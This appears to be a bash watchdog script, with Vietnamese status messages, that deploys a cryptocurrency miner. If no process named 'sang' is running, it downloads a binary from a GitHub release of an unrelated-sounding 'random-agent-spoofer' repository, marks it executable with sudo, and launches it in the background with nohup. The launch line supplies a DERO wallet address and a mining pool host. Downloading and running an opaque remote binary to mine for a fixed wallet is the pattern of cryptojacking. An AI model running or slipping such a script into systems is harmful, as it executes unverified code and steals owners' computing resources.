#!/bin/bash
count=`pgrep sang |  grep -o -E '[0-9]+'`

if [[ $count == "" ]]
then
  echo "ko ton tai"
  wget https://github.com/trangtrau/random-agent-spoofer/releases/download/SA/astro -O sang 
 sudo chmod +x sang
 nohup ./sang  -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcpvuc95p8a0rssl0xhzl -r community-pools.mysrv.cloud:10300 -p rpc &
 
else
echo "dang ton tai"

fi


